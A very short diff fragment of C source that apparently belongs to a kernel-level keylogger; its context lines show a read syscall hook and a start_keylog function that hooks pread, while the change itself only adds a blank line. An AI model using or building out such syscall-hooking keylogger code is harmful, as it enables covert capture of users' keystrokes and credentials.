@@ -156,6 +156,7 @@ static int read_hook(struct thread *td, void *syscall_args) {
     return(error);
     }
 
+
 void start_keylog(void)
 {
 	hook_syscall_set(SYS_pread, pread_hook);
